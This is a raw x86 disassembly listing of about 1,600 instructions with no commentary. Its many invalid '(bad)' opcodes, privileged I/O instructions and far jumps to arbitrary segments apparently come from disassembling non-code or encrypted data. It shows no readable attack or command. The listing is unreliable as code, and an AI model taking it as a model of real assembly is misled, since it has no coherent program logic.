  41203f:	stos   BYTE PTR es:[edi],al
  412040:	sub    ah,BYTE PTR [eax]
  412042:	aam    0xab
  412044:	sbb    DWORD PTR [edx-0x2c],edx
  412047:	pop    esi
  412048:	sar    BYTE PTR [esi-0x56],1
  41204b:	scas   al,BYTE PTR es:[edi]
  41204c:	inc    edi
  41204d:	mul    DWORD PTR [ecx]
  41204f:	dec    esp
  412050:	cwde   
  412051:	loopne 0x41201a
  412053:	cmc    
  412054:	xor    BYTE PTR [eax],ah
  412056:	xchg   BYTE PTR [ebx-0x34d1256a],cl
  41205c:	xchg   ecx,eax
  41205d:	frstor [esp+edx*8-0x3279ff45]
  412064:	sti    
  412065:	mov    ecx,0xa6a8b250
  41206a:	popa   
  41206b:	sbb    edx,edi
  41206d:	adc    ebx,DWORD PTR [edi]
  41206f:	xlat   BYTE PTR ds:[ebx]
  412070:	outs   dx,DWORD PTR ds:[esi]
  412071:	test   BYTE PTR [eax+0x57],al
  412074:	icebp  
  412075:	out    0xf8,eax
  412077:	dec    BYTE PTR [ebp-0x52]
  41207a:	retf   0xeed7
  41207d:	mov    WORD PTR [ecx+0x7f],?
  412080:	push   esi
  412081:	push   edi
  412082:	jg     0x412033
  412084:	jmp    0xd43c:0x5c6afdd7
  41208b:	leave  
  41208c:	int3   
  41208d:	ins    DWORD PTR es:[edi],dx
  41208e:	adc    bh,al
  412090:	test   al,0xa4
  412092:	sbb    DWORD PTR [ebx-0x7de95b50],ecx
  412098:	loopne 0x412024
  41209a:	sahf   
  41209b:	je     0x412050
  41209d:	xlat   BYTE PTR ds:[ebx]
  41209e:	add    al,0x39
  4120a0:	(bad)  
  4120a1:	ja     0x412046
  4120a3:	inc    edx
  4120a4:	retf   0x4935
  4120a7:	xchg   ebp,eax
  4120a8:	adc    ebx,esi
  4120aa:	shl    DWORD PTR [eax-0x3b4520c5],cl
  4120b0:	repnz rcr esi,cl
  4120b3:	into   
  4120b4:	cmp    al,0x15
  4120b6:	(bad)  
  4120b7:	mov    bh,BYTE PTR [edi-0x4f2db91e]
  4120bd:	mov    WORD PTR [eax],ss
  4120bf:	add    eax,0xbc6783c9
  4120c4:	lea    edx,[edx+0x703536a9]
  4120ca:	cwde   
  4120cb:	add    DWORD PTR [ecx-0x2c],ebx
  4120ce:	xchg   DWORD PTR [ebp-0x4d],edi
  4120d1:	and    al,0xe5
  4120d3:	xchg   edx,eax
  4120d4:	dec    ebx
  4120d5:	test   al,0x5a
  4120d7:	fidiv  DWORD PTR [esi+0x48]
  4120da:	cmc    
  4120db:	push   edx
  4120dc:	or     ebp,DWORD PTR [eax-0x2d]
  4120df:	or     eax,0x84909411
  4120e4:	jnp    0x4120bd
  4120e6:	jo     0x4120e4
  4120e8:	stos   DWORD PTR es:[edi],eax
  4120e9:	adc    al,BYTE PTR [esi]
  4120eb:	sbb    BYTE PTR [edx*1-0x7d6a5988],dl
  4120f2:	or     BYTE PTR [eax-0x6],dl
  4120f5:	int3   
  4120f6:	es (bad) 
  4120f8:	es into 
  4120fa:	scas   al,BYTE PTR es:[edi]
  4120fb:	jmp    0xab47:0xd58b2e23
  412102:	fucom  st(4)
  412104:	or     BYTE PTR [eax-0x59c25f48],dh
  41210a:	repnz fwait
  41210c:	mov    gs,bp
  41210f:	and    esi,edi
  412111:	xchg   edi,eax
  412112:	stc    
  412113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412114:	mov    bh,0x61
  412116:	shr    BYTE PTR [esi],1
  412118:	xor    ch,ch
  41211a:	inc    ebx
  41211b:	sub    al,BYTE PTR [eax]
  41211d:	or     ebp,DWORD PTR [edi+eiz*8-0x32]
  412121:	aas    
  412122:	les    edi,FWORD PTR [ebp+0x7e8e2ab6]
  412128:	sar    DWORD PTR [eax+0x7bb3384a],cl
  41212e:	jg     0x4121a1
  412130:	xor    al,0x39
  412132:	pop    edi
  412133:	mov    al,ds:0x5089084c
  412138:	mov    dl,0xaf
  41213a:	out    0xda,eax
  41213c:	scas   eax,DWORD PTR es:[edi]
  41213d:	pushf  
  41213e:	push   eax
  41213f:	aad    0x3
  412141:	dec    eax
  412142:	(bad)  
  412143:	fst    QWORD PTR [esi-0x1ed5234e]
  412149:	mov    ebx,0xb13841b8
  41214e:	mul    DWORD PTR [ecx]
  412150:	adc    dl,BYTE PTR [ecx-0x51a4261b]
  412156:	add    eax,DWORD PTR [ecx+0x7]
  412159:	or     eax,ebp
  41215b:	into   
  41215c:	and    al,al
  41215e:	cwde   
  41215f:	out    0x6c,eax
  412161:	cmp    eax,0xe7ee439
  412166:	imul   ebx,DWORD PTR [ebp+0x24559363],0x3d
  41216d:	add    esi,DWORD PTR [edx-0x58be7e04]
  412173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412174:	or     DWORD PTR [eax+0x7a],ebx
  412177:	push   edx
  412178:	cmp    al,0x27
  41217a:	hlt    
  41217b:	mov    ah,0xe9
  41217d:	jne    0x412144
  41217f:	stos   DWORD PTR es:[edi],eax
  412180:	push   ds
  412181:	ins    DWORD PTR es:[edi],dx
  412182:	add    BYTE PTR [ebx],cl
  412184:	fwait
  412185:	jle    0x4121f5
  412187:	pusha  
  412188:	xor    eax,0xc048762
  41218d:	popf   
  41218e:	aaa    
  41218f:	jae    0x412170
  412191:	fiadd  DWORD PTR [ebx+0x46]
  412194:	stos   DWORD PTR es:[edi],eax
  412195:	push   eax
  412196:	inc    esp
  412197:	jnp    0x4121a2
  412199:	jg     0x4121a8
  41219b:	(bad)  
  41219c:	dec    esp
  41219d:	xchg   ebx,ecx
  41219f:	(bad)  
  4121a1:	pop    ebx
  4121a2:	test   eax,0xf5200cb1
  4121a7:	dec    ebx
  4121a8:	test   eax,0x747f9452
  4121ad:	mov    al,ds:0x8103447a
  4121b2:	fild   DWORD PTR [edx]
  4121b4:	xchg   ecx,eax
  4121b5:	daa    
  4121b6:	xchg   esi,eax
  4121b7:	repnz rcr bh,0x41
  4121bb:	in     al,0xb2
  4121bd:	mov    esp,0xe96b515e
  4121c2:	cwde   
  4121c3:	sub    DWORD PTR [ecx],ebp
  4121c5:	jg     0x412189
  4121c7:	sahf   
  4121c8:	add    eax,0x8a3c3c77
  4121cd:	adc    ebx,DWORD PTR [ecx-0x23c31c67]
  4121d3:	in     al,0x39
  4121d5:	or     DWORD PTR [ebx-0x6f2a5378],ebp
  4121db:	add    al,0xf0
  4121dd:	leave  
  4121de:	repnz das 
  4121e0:	xchg   ebx,eax
  4121e1:	in     eax,0xec
  4121e3:	add    edx,edi
  4121e5:	mov    esi,0x2ba7bb22
  4121ea:	loop   0x4121bf
  4121ec:	sbb    dl,BYTE PTR [ebp-0x39]
  4121ef:	cmp    edi,DWORD PTR [ecx]
  4121f1:	jecxz  0x412233
  4121f3:	sar    DWORD PTR [esi],0xfe
  4121f6:	test   esi,esi
  4121f8:	dec    eax
  4121f9:	mov    ds:0x8b5503a1,eax
  4121fe:	mov    dl,0x8b
  412200:	loop   0x4121ea
  412202:	or     edi,DWORD PTR [ecx+0x35]
  412205:	mov    eax,ds:0xe9507aac
  41220a:	hlt    
  41220b:	ins    DWORD PTR es:[edi],dx
  41220c:	adc    eax,0x9bb14b43
  412211:	dec    ecx
  412212:	jmp    0x69c7a2e3
  412217:	test   eax,edi
  412219:	in     eax,dx
  41221a:	aaa    
  41221b:	je     0x4121bb
  41221d:	retf   0xac94
  412220:	stc    
  412221:	in     eax,dx
  412222:	leave  
  412223:	aaa    
  412224:	out    dx,eax
  412225:	or     BYTE PTR [ebx-0x78],bh
  412228:	jl     0x412244
  41222a:	(bad)  
  41222b:	jmp    0xeb53d18a
  412230:	xor    ch,dl
  412232:	push   ebp
  412233:	sbb    ebp,edi
  412235:	shl    ebp,1
  412237:	vmwrite ebp,edi
  41223a:	cmp    edx,DWORD PTR [edi+0x1c6dc7f4]
  412240:	paddsw mm7,QWORD PTR [ebx-0x71a4bfa8]
  412247:	mov    ds:0x54e34f6f,al
  41224c:	and    eax,0xb719408
  412251:	hlt    
  412252:	fld    QWORD PTR [edi]
  412254:	les    esi,FWORD PTR [eax]
  412256:	into   
  412257:	hlt    
  412258:	mov    edi,?
  41225a:	loope  0x4121f5
  41225c:	xor    esp,DWORD PTR [edx-0x63]
  41225f:	clc    
  412260:	xor    eax,0x5308edc0
  412265:	dec    ecx
  412266:	call   0x617a:0x6dd7f6c9
  41226d:	adc    bh,BYTE PTR [ecx+0x3b]
  412270:	cmc    
  412271:	pop    ecx
  412272:	(bad)  
  412273:	push   edx
  412274:	dec    ebx
  412275:	rol    BYTE PTR fs:[esi-0x59],cl
  412279:	das    
  41227a:	rcr    ah,0x2
  41227d:	nop
  41227e:	fiadd  WORD PTR [esi+0x36]
  412281:	xor    DWORD PTR ds:0x66224427,ebp
  412287:	ss pop esp
  412289:	mov    ds:0x76fe25b3,al
  41228e:	shr    BYTE PTR [eax-0x2055322],0x84
  412295:	or     al,0xf4
  412297:	into   
  412298:	cli    
  412299:	jbe    0x412275
  41229b:	jne    0x4122e0
  41229d:	or     DWORD PTR [edi],edx
  41229f:	arpl   WORD PTR [eax],bp
  4122a1:	adc    DWORD PTR [ebx+0x27672ab1],ebx
  4122a7:	xor    DWORD PTR [eax],ebx
  4122a9:	jg     0x4122ab
  4122ab:	in     al,dx
  4122ac:	lods   al,BYTE PTR ds:[esi]
  4122ad:	lea    esp,[ecx-0x2fe22d95]
  4122b3:	jmp    0x690d6653
  4122b8:	mov    al,ds:0x1539f728
  4122bd:	clc    
  4122be:	test   eax,0x15427a0d
  4122c3:	out    dx,eax
  4122c4:	mov    eax,ds:0x3cbd8acd
  4122c9:	sar    BYTE PTR [ebx],cl
  4122cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122cc:	not    DWORD PTR [ebx-0x39]
  4122cf:	pop    es
  4122d0:	mul    DWORD PTR [ecx-0x18]
  4122d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122d4:	adc    esi,DWORD PTR [edi]
  4122d6:	pop    edx
  4122d7:	in     eax,dx
  4122d8:	dec    esi
  4122d9:	in     al,0xf
  4122db:	xchg   edi,eax
  4122dc:	(bad)  
  4122df:	ins    BYTE PTR es:[edi],dx
  4122e0:	scas   eax,DWORD PTR es:[edi]
  4122e1:	arpl   bx,bx
  4122e3:	or     ecx,ebp
  4122e5:	dec    eax
  4122e6:	(bad)  
  4122e7:	mov    edx,esi
  4122e9:	add    eax,0x6e82d00a
  4122ee:	push   ds
  4122ef:	and    al,0x6a
  4122f1:	adc    esp,edx
  4122f3:	add    esi,0x9
  4122f6:	pop    ss
  4122f7:	aaa    
  4122f8:	into   
  4122f9:	shl    DWORD PTR [esi],1
  4122fb:	jg     0x4122d1
  4122fd:	clc    
  4122fe:	adc    al,0x6f
  412300:	xchg   eax,ecx
  412302:	pop    eax
  412303:	jmp    0x3b14:0x5fea5af6
  41230a:	(bad)  
  41230c:	and    ah,BYTE PTR [edx]
  41230e:	xor    DWORD PTR [edx],edx
  412310:	sahf   
  412311:	imul   edx,DWORD PTR [ebp+0x18],0x56
  412315:	inc    ebx
  412316:	push   0xffffffb2
  412318:	xor    DWORD PTR [ecx+0x5a],ebx
  41231b:	pusha  
  41231c:	mov    bh,0xcc
  41231e:	or     edi,DWORD PTR [ecx]
  412320:	hlt    
  412321:	sub    BYTE PTR [eax+0x14],cl
  412324:	out    dx,eax
  412325:	retf   0x9c5b
  412328:	adc    al,0x5
  41232a:	in     al,dx
  41232b:	mov    BYTE PTR [ebx+ecx*4+0x64],cl
  41232f:	inc    DWORD PTR [eax-0x80]
  412332:	mov    ah,0xde
  412334:	mov    ebp,0xd6812c61
  412339:	xor    ebx,esi
  41233b:	push   eax
  41233c:	mov    bl,0x9
  41233e:	js     0x41233e
  412340:	sub    bh,bl
  412342:	lahf   
  412343:	jnp    0x412362
  412345:	inc    esi
  412346:	pushf  
  412347:	xchg   bh,dh
  412349:	fdiv   st(6),st
  41234b:	ins    BYTE PTR es:[edi],dx
  41234c:	cmp    esi,ecx
  41234e:	or     al,al
  412350:	xor    eax,0xaf4d90a3
  412355:	shl    dl,0xd1
  412358:	dec    edx
  412359:	pop    eax
  41235a:	push   ebx
  41235b:	mov    BYTE PTR [esp+ebp*8-0x1a248948],dh
  412362:	push   ebp
  412363:	cmp    eax,0xec0fba7
  412368:	mov    edx,0xa1ec55d5
  41236d:	dec    ecx
  41236e:	jecxz  0x412389
  412370:	js     0x41238e
  412372:	or     ecx,DWORD PTR [ebp+0x5e18d23e]
  412378:	scas   eax,DWORD PTR es:[edi]
  412379:	jmp    0xba5cac90
  41237e:	clc    
  41237f:	ins    BYTE PTR es:[edi],dx
  412380:	in     eax,0xff
  412382:	add    esi,DWORD PTR [eax+0x4c5c80ba]
  412388:	dec    edx
  412389:	mov    WORD PTR [ebp+0x55],ss
  41238c:	add    bl,dl
  41238e:	loopne 0x4123c5
  412390:	into   
  412391:	cmc    
  412392:	sbb    esi,esp
  412394:	mov    bh,0x7c
  412396:	bound  edi,QWORD PTR [eax-0x3d040266]
  41239c:	imul   edi,DWORD PTR ds:0x9538c0d6,0xffffff82
  4123a3:	xchg   BYTE PTR [eax+0x561c6aea],dl
  4123a9:	addr16 or al,0xca
  4123ac:	xor    dl,BYTE PTR [esi+0x50]
  4123af:	mov    edx,0xce777d46
  4123b4:	call   0xf664:0x13a90094
  4123bb:	mov    ah,0x6e
  4123bd:	bound  ebp,QWORD PTR ds:0x3e05f3ad
  4123c3:	gs add edx,DWORD PTR fs:[eax-0x1f2bb0df]
  4123cb:	pop    edi
  4123cc:	out    0x8,al
  4123ce:	xchg   esi,edi
  4123d0:	push   edi
  4123d1:	popa   
  4123d2:	mov    BYTE PTR [eax+ecx*1],al
  4123d5:	inc    edx
  4123d6:	stos   BYTE PTR es:[edi],al
  4123d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123d8:	add    BYTE PTR [ebx],bh
  4123da:	dec    eax
  4123db:	cmp    eax,0xd0fb3327
  4123e0:	push   eax
  4123e1:	cld    
  4123e2:	in     eax,dx
  4123e3:	jns    0x41241c
  4123e5:	out    0x11,al
  4123e7:	ss into 
  4123e9:	dec    esp
  4123ea:	fucom  st(5)
  4123ec:	and    eax,0x3b457cd2
  4123f1:	jle    0x412427
  4123f3:	inc    eax
  4123f4:	sub    bl,BYTE PTR [edi]
  4123f6:	cs pop es
  4123f8:	sbb    edx,DWORD PTR [edx-0x80]
  4123fb:	sbb    esp,DWORD PTR ds:0x55599095
  412401:	call   0xce0836bc
  412406:	fisub  WORD PTR [ebx+0x17]
  412409:	xchg   edx,eax
  41240a:	out    dx,al
  41240b:	mov    bl,0x9d
  41240d:	inc    esi
  41240e:	xor    al,0x8e
  412410:	add    cl,BYTE PTR [ebp+0x1a7c9de6]
  412416:	cwde   
  412417:	loopne 0x412493
  412419:	sbb    BYTE PTR ds:0x56533f8a,al
  41241f:	enter  0x713f,0x2d
  412423:	xlat   BYTE PTR ds:[ebx]
  412424:	leave  
  412425:	sub    bh,BYTE PTR ds:0xc03e13d
  41242b:	div    BYTE PTR [edx]
  41242d:	fsubr  QWORD PTR [edi+0x532efea3]
  412433:	out    dx,eax
  412434:	dec    esi
  412435:	mov    esp,0x3b21d09d
  41243a:	outs   dx,DWORD PTR ds:[esi]
  41243b:	gs es pop eax
  41243e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41243f:	in     al,dx
  412440:	gs mov dh,0x65
  412443:	dec    edx
  412444:	ret    0x439
  412447:	mov    al,0x24
  412449:	sub    DWORD PTR [esi],esi
  41244b:	inc    esp
  41244c:	and    eax,0xe5908513
  412451:	jmp    DWORD PTR [eax-0x2f1116c0]
  412457:	sub    al,0x26
  412459:	in     eax,dx
  41245a:	xor    al,0xb5
  41245c:	sahf   
  41245d:	inc    edx
  41245e:	or     eax,0x8d4b3bc9
  412463:	xchg   BYTE PTR [edx+ecx*8],cl
  412466:	fwait
  412467:	js     0x4124d6
  412469:	mov    ebx,DWORD PTR [ebx+0xc]
  41246c:	in     al,0x18
  41246e:	ss ins DWORD PTR es:[edi],dx
  412470:	mov    gs,WORD PTR [ebp-0x3e]
  412473:	retf   
  412474:	xor    dh,ah
  412476:	mul    BYTE PTR [edx+0x1dd27873]
  41247c:	mov    esi,cs
  41247e:	cmp    eax,0x8887ca37
  412483:	iret   
  412484:	xchg   ebp,eax
  412485:	aad    0x6c
  412487:	push   ebx
  412488:	adc    BYTE PTR [ecx+0x6e6dcd3],al
  41248e:	pop    es
  41248f:	lea    edx,[ebx-0x1a]
  412492:	jmp    0x632f:0x6fad150f
  412499:	test   eax,0x5dd55bcd
  41249e:	outs   dx,BYTE PTR ds:[esi]
  41249f:	adc    edx,DWORD PTR [edx+esi*2+0x1c]
  4124a3:	jge    0x41246e
  4124a5:	mov    ch,0xeb
  4124a7:	in     eax,dx
  4124a8:	out    dx,al
  4124a9:	push   eax
  4124aa:	dec    eax
  4124ab:	sub    esi,DWORD PTR [esp+ebx*2+0x6787ad1c]
  4124b2:	cmp    al,0xe0
  4124b4:	cmp    al,0x7a
  4124b6:	stos   BYTE PTR es:[edi],al
  4124b7:	int    0x25
  4124b9:	push   eax
  4124ba:	dec    edi
  4124bb:	int3   
  4124bc:	ret    0x8719
  4124bf:	ins    DWORD PTR es:[edi],dx
  4124c0:	leave  
  4124c1:	sbb    eax,0xfd239df
  4124c6:	pushf  
  4124c7:	out    0xf6,al
  4124c9:	sbb    ebp,0x94b95dd8
  4124cf:	repz bnd jb 0x412545
  4124d3:	push   ss
  4124d4:	xchg   ecx,eax
  4124d5:	mov    edx,0x2b1f3226
  4124da:	out    0xeb,al
  4124dc:	dec    eax
  4124dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124de:	fisubr WORD PTR [esi+0x3ee5867e]
  4124e4:	leave  
  4124e5:	dec    ecx
  4124e6:	arpl   WORD PTR [ebx+0x60],cx
  4124e9:	lock dec edi
  4124eb:	int3   
  4124ec:	cmp    eax,0xd4d709a
  4124f1:	hlt    
  4124f2:	xor    BYTE PTR [ebp-0x25d6cb3d],cl
  4124f8:	mov    dl,0x50
  4124fa:	in     al,dx
  4124fb:	push   eax
  4124fc:	vpunpckhqdq xmm4,xmm1,xmm0
  412500:	(bad)
  412504:	mov    DWORD PTR [ebx],edx
  412506:	pop    es
  412507:	loope  0x41248a
  412509:	push   esi
  41250a:	jmp    0x5258:0x425cd274
  412511:	push   cx
  412513:	pop    ebp
  412514:	adc    eax,0x778035bd
  412519:	dec    ecx
  41251a:	gs cmc 
  41251c:	imul   edx,ebx,0x2326be36
  412522:	xchg   ebp,eax
  412523:	xlat   BYTE PTR ds:[ebx]
  412524:	call   0x88ee:0xefe36a0c
  41252b:	push   es
  41252c:	push   edi
  41252d:	ins    BYTE PTR es:[edi],dx
  41252e:	sbb    dh,bl
  412530:	test   BYTE PTR [eax+0x14b1d9bd],ch
  412536:	push   edx
  412537:	jae    0x412523
  412539:	arpl   WORD PTR [esi+esi*8],di
  41253c:	ds push edi
  41253e:	icebp  
  41253f:	popf   
  412540:	in     al,0x95
  412542:	xchg   edx,eax
  412543:	jne    0x41257b
  412545:	and    al,0x17
  412547:	rcr    dl,cl
  412549:	sbb    al,0x5a
  41254b:	lock cmp ecx,edi
  41254e:	add    edi,DWORD PTR [ebx+0x64500a3]
  412554:	dec    eax
  412555:	stos   BYTE PTR es:[edi],al
  412556:	mov    dl,0xad
  412558:	js     0x41253e
  41255a:	imul   edi,DWORD PTR [edi+0x48],0x5ba50b30
  412561:	xchg   ecx,esi
  412563:	add    eax,0x7ce3a284
  412568:	sbb    edx,DWORD PTR [edi+0x581951b8]
  41256e:	jg     0x4125e9
  412570:	jecxz  0x412518
  412572:	hlt    
  412573:	push   ecx
  412574:	sub    ah,BYTE PTR [ebx-0x3dff42c9]
  41257a:	xor    edx,eax
  41257c:	stos   BYTE PTR es:[edi],al
  41257d:	or     bh,BYTE PTR [esi+0x3a]
  412580:	ror    BYTE PTR [esi+0xf],1
  412583:	out    dx,eax
  412584:	(bad)  
  412585:	mov    dl,0x56
  412587:	jne    0x4125b2
  412589:	xchg   ecx,eax
  41258a:	daa    
  41258b:	js     0x41252c
  41258d:	dec    eax
  41258e:	ds hlt 
  412590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412591:	fimul  WORD PTR [ebx+0x5f]
  412594:	mov    esp,0x6e54aaa8
  412599:	loope  0x412571
  41259b:	sbb    eax,0x3fd6eb13
  4125a0:	out    0x6a,eax
  4125a2:	jnp    0x4125fe
  4125a4:	cs in  eax,0x22
  4125a7:	fwait
  4125a8:	lahf   
  4125a9:	jno    0x412602
  4125ab:	pusha  
  4125ac:	dec    edx
  4125ad:	aaa    
  4125ae:	retf   
  4125af:	in     al,dx
  4125b0:	repnz out 0xd0,al
  4125b3:	test   DWORD PTR [edx-0x17],esp
  4125b6:	mov    eax,fs:0x60a7c4a4
  4125bc:	push   ds
  4125bd:	gs ret 0xbcd4
  4125c1:	ret    0xca19
  4125c4:	clc    
  4125c5:	rcl    ah,cl
  4125c7:	fadd   st,st(0)
  4125c9:	test   al,0x70
  4125cb:	add    ecx,ebx
  4125cd:	adc    ebp,DWORD PTR [ebx+0x7fe143f1]
  4125d3:	push   ds
  4125d4:	inc    edx
  4125d5:	sub    DWORD PTR [ebp-0x12],ebx
  4125d8:	in     al,dx
  4125d9:	mov    cs,ecx
  4125db:	xchg   esi,eax
  4125dc:	cmp    esp,DWORD PTR [edi+0x33c8105]
  4125e2:	cmp    ebp,DWORD PTR [ebp-0x630599af]
  4125e8:	clc    
  4125e9:	pushf  
  4125ea:	jecxz  0x41262d
  4125ec:	sbb    BYTE PTR [ecx-0x55f7e86a],dh
  4125f2:	or     DWORD PTR [ecx+0x3d4ef7e0],esi
  4125f8:	xchg   esp,eax
  4125f9:	loopne 0x412593
  4125fb:	cmp    al,0xb7
  4125fd:	cmc    
  4125fe:	leave  
  4125ff:	ins    DWORD PTR es:[edi],dx
  412600:	(bad)  
  412601:	pop    esi
  412602:	mov    dh,0x1a
  412604:	mov    ch,0xf7
  412606:	mov    ebp,0x52a7568
  41260b:	leave  
  41260c:	cs int 0x68
  41260f:	jecxz  0x412622
  412611:	push   cs
  412612:	xchg   edx,eax
  412613:	sbb    edx,DWORD PTR [edx-0x6ebabc8b]
  412619:	pop    esi
  41261a:	rcl    DWORD PTR [esi-0x38],0x1c
  41261e:	push   DWORD PTR [esp+eax*4-0x36]
  412622:	popa   
  412623:	cmp    BYTE PTR [ebx-0x4f],0xd2
  412627:	sti    
  412628:	cmc    
  412629:	dec    al
  41262b:	into   
  41262c:	enter  0xaf72,0x2f
  412630:	in     al,0x24
  412632:	je     0x41264d
  412634:	fild   QWORD PTR [eax-0x5c9e6158]
  41263a:	and    al,0xa7
  41263c:	sti    
  41263d:	or     WORD PTR [eax-0x5f],bx
  412641:	sti    
  412642:	pop    ebp
  412643:	addr16 mov edx,0xe404f447
  412649:	cmp    ch,BYTE PTR [eax]
  41264b:	mov    ecx,0x3c8e8fd
  412650:	mov    BYTE PTR [eax+0x6588786a],cl
  412656:	pop    esi
  412657:	imul   edi,DWORD PTR cs:[edx+0x5a],0x513f2049
  41265f:	mov    bh,0x8f
  412661:	xchg   ebx,eax
  412662:	inc    edx
  412663:	sti    
  412664:	js     0x4126e1
  412666:	mov    esi,0x52228883
  41266b:	rol    DWORD PTR [esi-0x6938e27],cl
  412671:	cli    
  412672:	mov    ecx,DWORD PTR [ebx-0x35]
  412675:	dec    esp
  412676:	(bad)  
  412677:	dec    eax
  412678:	cmp    esi,DWORD PTR [eax-0x25]
  41267b:	jo     0x412610
  41267d:	push   edi
  41267e:	mov    ebx,0xb7f101cf
  412683:	dec    edx
  412684:	sbb    ebx,DWORD PTR [ebx-0x4b79a2c3]
  41268a:	stos   DWORD PTR es:[edi],eax
  41268b:	enter  0xbe52,0xa9
  41268f:	test   eax,0xa97c1072
  412694:	mov    dh,0x49
  412696:	lods   eax,DWORD PTR ds:[esi]
  412697:	(bad)  
  412699:	stos   BYTE PTR es:[edi],al
  41269a:	push   ecx
  41269b:	clc    
  41269c:	mov    eax,0xe3e089ab
  4126a1:	sbb    bh,ch
  4126a3:	pop    es
  4126a4:	xor    esp,DWORD PTR [edi]
  4126a6:	cmp    al,0xe1
  4126a8:	test   DWORD PTR [ecx+0x39],edi
  4126ab:	mov    ebx,0x7879a3c6
  4126b0:	and    ebx,eax
  4126b2:	retf   
  4126b3:	mov    ah,0xb6
  4126b5:	cmp    ch,ah
  4126b7:	jmp    0x3ad01631
  4126bc:	or     bh,BYTE PTR [ebx+ebp*1+0x4]
  4126c0:	lds    esp,FWORD PTR [ebp-0x7f]
  4126c3:	pop    edx
  4126c4:	sti    
  4126c5:	xchg   ecx,eax
  4126c6:	push   esi
  4126c7:	dec    esi
  4126c8:	xor    eax,0x47cdf003
  4126cd:	or     dl,BYTE PTR [eax-0x524e987e]
  4126d3:	ret    
  4126d4:	rol    DWORD PTR [eax],cl
  4126d6:	icebp  
  4126d7:	sbb    DWORD PTR [edi-0x27],edi
  4126da:	sub    al,0x9b
  4126dc:	pop    edi
  4126dd:	aam    0x8a
  4126df:	sbb    esi,ecx
  4126e1:	sub    BYTE PTR [ecx-0x50],ah
  4126e4:	push   ebx
  4126e5:	fchs   
  4126e7:	leave  
  4126e8:	sahf   
  4126e9:	loopne 0x412742
  4126eb:	aas    
  4126ec:	lea    esi,[ebp-0x720b261c]
  4126f2:	jmp    0x7ff1e1aa
  4126f7:	dec    eax
  4126f8:	mov    al,0xd4
  4126fb:	mov    ebx,0xe283804a
  412700:	stos   DWORD PTR es:[edi],eax
  412701:	and    edi,DWORD PTR [edx]
  412703:	adc    eax,0xc2c9499e
  412708:	xor    BYTE PTR [edi+0x63619ed8],0x51
  41270f:	das    
  412710:	pop    eax
  412711:	add    DWORD PTR [esi-0x9],edi
  412714:	and    BYTE PTR [ebx+0x1cba3edf],ch
  41271a:	out    dx,al
  41271b:	fdivr  DWORD PTR [ebp+0x664e4d74]
  412721:	leave  
  412722:	or     ch,BYTE PTR [ebp+0x823c6de]
  412728:	jb     0x4126ee
  41272a:	add    ch,dl
  41272c:	imul   cl
  41272e:	jne    0x412728
  412730:	ret    0x69bc
  412733:	(bad)  
  412734:	sbb    al,0x4c
  412736:	mov    BYTE PTR [eax],bh
  412738:	sub    al,0x93
  41273a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41273b:	into   
  41273c:	idiv   ebx
  41273e:	test   BYTE PTR [esi+0x6f],ah
  412741:	pop    eax
  412742:	cmp    dh,al
  412744:	mov    edi,0xb7015f7d
  412749:	add    ch,dh
  41274b:	sub    edi,ebp
  41274d:	(bad)  
  41274e:	cmp    eax,0x8fc5094d
  412753:	mov    dl,0x76
  412755:	push   0xcfe8325d
  41275a:	retf   0x10e1
  41275d:	loope  0x412722
  41275f:	fcomp  st(0)
  412761:	fnsave [ecx+0x7d]
  412764:	mov    eax,ds:0x1194ace3
  412769:	add    eax,0x410886b5
  41276e:	stos   BYTE PTR es:[edi],al
  41276f:	shl    ah,1
  412771:	lea    esi,[ecx]
  412773:	bnd jge 0x41274a
  412776:	(bad)  
  412777:	cs das 
  412779:	into   
  41277a:	sbb    eax,DWORD PTR [eax]
  41277c:	stos   DWORD PTR es:[edi],eax
  41277d:	sub    eax,0x3fcb7344
  412782:	pop    ebx
  412783:	(bad)
  412786:	das    
  412787:	mov    ebp,0x4e46b572
  41278c:	pop    es
  41278d:	out    0x5b,eax
  41278f:	adc    DWORD PTR [eax],ebx
  412791:	pushf  
  412792:	in     eax,dx
  412793:	inc    ebx
  412794:	call   0x600ab1af
  412799:	mov    cs:0x7e4b3ac1,al
  41279f:	lds    ecx,FWORD PTR [eax-0x600155ef]
  4127a5:	xchg   edi,eax
  4127a6:	dec    esi
  4127a7:	shl    BYTE PTR [esi+0x710ea7ad],0xf9
  4127ae:	push   es
  4127af:	and    eax,0x818355de
  4127b4:	push   eax
  4127b5:	push   ds
  4127b6:	(bad)  
  4127b7:	xor    bl,ah
  4127b9:	dec    esi
  4127ba:	adc    cl,cl
  4127bc:	test   BYTE PTR [ebx-0x72],al
  4127bf:	(bad)  [esi]
  4127c1:	(bad)  
  4127c2:	dec    BYTE PTR [eax]
  4127c4:	and    dh,bh
  4127c6:	or     eax,0xee3be31d
  4127cb:	fs mov ebp,0xcd94e98e
  4127d1:	mov    al,0x43
  4127d3:	sub    al,0xc8
  4127d5:	test   DWORD PTR [ebp-0x58ca4ef6],ebp
  4127db:	fucomp st(2)
  4127dd:	xor    al,0x4e
  4127df:	mov    esp,0xc5eb00bc
  4127e4:	stos   DWORD PTR es:[edi],eax
  4127e5:	cmp    esi,DWORD PTR [eax]
  4127e7:	test   eax,0xbb77eec0
  4127ec:	loope  0x4127bc
  4127ee:	pop    ebx
  4127ef:	rcr    BYTE PTR [edx],0xc7
  4127f2:	mov    gs,esp
  4127f4:	ins    BYTE PTR es:[edi],dx
  4127f5:	push   eax
  4127f6:	cmp    al,0xf2
  4127f8:	jg     0x412873
  4127fa:	gs inc ebp
  4127fc:	or     al,0xfd
  4127fe:	hlt    
  4127ff:	jo     0x41284e
  412801:	cmp    eax,0xaf8e454e
  412806:	and    al,0x5e
  412808:	pop    ecx
  412809:	jecxz  0x412854
  41280b:	dec    esi
  41280c:	xchg   DWORD PTR [edx-0x59],esp
  41280f:	jns    0x412872
  412811:	or     BYTE PTR [ebx],bl
  412813:	std    
  412814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412815:	dec    esi
  412816:	inc    edi
  412817:	frstor [edi]
  412819:	mov    al,ds:0x19035cbb
